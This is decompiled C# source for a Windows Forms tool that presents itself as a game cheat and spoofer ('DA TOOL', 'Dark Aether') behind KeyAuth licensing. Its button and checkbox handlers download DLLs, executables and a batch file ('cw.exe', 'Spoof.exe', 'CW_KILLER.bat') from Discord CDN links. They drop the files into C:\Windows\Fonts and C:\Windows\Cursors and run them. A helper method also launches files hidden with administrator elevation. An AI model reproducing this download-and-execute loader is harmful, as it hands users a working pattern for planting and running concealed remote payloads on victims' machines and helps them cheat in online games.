using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Windows.Forms;
using FAZEDAuth;
using Guna.UI2.WinForms;
using Siticone.UI.AnimatorNS;
using Siticone.UI.WinForms;

namespace KeyAuth
{
	// Token: 0x02000015 RID: 21
	public partial class MainDA : Form
	{
		// Token: 0x060000A1 RID: 161 RVA: 0x000037D0 File Offset: 0x000037D0
		public MainDA()
		{
			this.InitializeComponent();
		}

		// Token: 0x060000A2 RID: 162 RVA: 0x000037EC File Offset: 0x000037EC
		public void startInstall(string wK)
		{
			Process process = new Process();
			process.StartInfo.FileName = wK;
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.Verb = "runas";
			process.Start();
			process.WaitForExit();
		}

		// Token: 0x060000A3 RID: 163 RVA: 0x0000383E File Offset: 0x0000383E
		private void siticoneControlBox1_Click(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		// Token: 0x060000A4 RID: 164 RVA: 0x00003848 File Offset: 0x00003848
		private void Main_Load(object sender, EventArgs e)
		{
			this.panel1.Location = new Point(11, 39);
			this.panel2.Location = new Point(11, 39);
			this.panel2.Visible = false;
			this.panel1.Visible = true;
			this.label8.Text = (LoginMenu.King.user_data.username ?? "");
		}

		// Token: 0x060000A5 RID: 165 RVA: 0x000038B8 File Offset: 0x000038B8
		public DateTime UnixTimeToDateTime(long unixtime)
		{
			DateTime result = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local);
			result = result.AddSeconds((double)unixtime).ToLocalTime();
			return result;
		}

		// Token: 0x060000A6 RID: 166 RVA: 0x000038EC File Offset: 0x000038EC
		private void button1_Click(object sender, EventArgs e)
		{
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/967859990067032064/978173569592872980/Newtonsoft.Json.dll", "C:\\Windows\\Fonts\\Newtonsoft.Json.dll");
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/967859990067032064/978173569827766292/ReaLTaiizor.dll", "C:\\Windows\\Fonts\\ReaLTaiizor.dll");
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/967859990067032064/978173570557566986/System.Diagnostics.EventLog.dll", "C:\\Windows\\Fonts\\System.Diagnostics.EventLog.dll");
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/967859990067032064/978173570830176296/System.ServiceProcess.ServiceController.dll", "C:\\Windows\\Fonts\\System.ServiceProcess.ServiceController.dll");
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/967859990067032064/978173585057255424/FontAwesome.Sharp.dll", "C:\\Windows\\Fonts\\FontAwesome.Sharp.dll");
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/955962478100095046/978790520094621776/cw.exe", "C:\\Windows\\Fonts\\cw.exe");
			Process.Start("C:\\Windows\\Fonts\\cw.exe");
			MessageBox.Show("Instant Dark Aether\nWait 30 Secs", "DA TOOL", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x060000A7 RID: 167 RVA: 0x0000398F File Offset: 0x0000398F
		private void checkBox1_CheckedChanged(object sender, EventArgs e)
		{
			if (this.checkBox1.Checked)
			{
				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/955972051221495868/978889492708618240/CW_KILLER.bat", "C:\\Windows\\Fonts\\CW_KILLER.bat");
				Process.Start("C:\\Windows\\Fonts\\CW_KILLER.bat");
			}
		}

		// Token: 0x060000A8 RID: 168 RVA: 0x000039BD File Offset: 0x000039BD
		private void button5_Click(object sender, EventArgs e)
		{
			this.panel2.Visible = false;
			this.panel1.Visible = true;
			this.checkBox1.Visible = true;
		}

		// Token: 0x060000A9 RID: 169 RVA: 0x000039E3 File Offset: 0x000039E3
		private void button3_Click(object sender, EventArgs e)
		{
			Process.Start("https://discord.gg/DTvmR6JyJ4");
		}

		// Token: 0x060000AA RID: 170 RVA: 0x000039F0 File Offset: 0x000039F0
		private void button4_Click(object sender, EventArgs e)
		{
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/967859990067032064/974441054059253780/Spoof.exe", "C:\\Windows\\Cursors\\Spoof.exe");
			Process.Start("C:\\Windows\\Cursors\\Spoof.exe");
			MessageBox.Show("Running Drivers..", "Please Wait, Loading..", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		// Token: 0x060000AB RID: 171 RVA: 0x00003A24 File Offset: 0x00003A24
		private void transparency_Scroll(object sender, EventArgs e)
		{
			if (this.guna2TrackBar1.Value >= 100)
			{
				base.Opacity = 100.0;
				this.label4.Text = "(" + this.guna2TrackBar1.Value.ToString() + "%)";
				return;
			}
			if (this.guna2TrackBar1.Value <= 9)
			{
				string s = "0.0" + this.guna2TrackBar1.Value.ToString();
				base.Opacity = (double)float.Parse(s);
				this.label4.Text = "(" + this.guna2TrackBar1.Value.ToString() + "%)";
				return;
			}
			string s2 = "0." + this.guna2TrackBar1.Value.ToString();
			base.Opacity = (double)float.Parse(s2);
			this.label4.Text = "(" + this.guna2TrackBar1.Value.ToString() + "%)";
		}

		// Token: 0x060000AC RID: 172 RVA: 0x00003B3D File Offset: 0x00003B3D
		private void button2_Click(object sender, EventArgs e)
		{
			this.panel1.Visible = false;
			this.panel2.Visible = true;
			this.checkBox1.Visible = false;
		}

		// Token: 0x060000AD RID: 173 RVA: 0x00003B63 File Offset: 0x00003B63
		private void button7_Click(object sender, EventArgs e)
		{
			this.panel1.Visible = true;
			this.checkBox1.Visible = true;
		}

		// Token: 0x060000AE RID: 174 RVA: 0x00003B7D File Offset: 0x00003B7D
		private void button6_Click(object sender, EventArgs e)
		{
			this.panel1.Visible = false;
			this.checkBox1.Visible = false;
		}

		// Token: 0x060000AF RID: 175 RVA: 0x00003B97 File Offset: 0x00003B97
		private void siticoneControlBox2_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		// Token: 0x04000055 RID: 85
		private string pathh;

		// Token: 0x04000056 RID: 86
		private static Random vm = new Random();

		// Token: 0x04000057 RID: 87
		private ulong scan;

		// Token: 0x04000058 RID: 88
		private string chatchannel = "testing";

        private void panel2_Paint(object sender, PaintEventArgs e)
        {

        }
    }
}
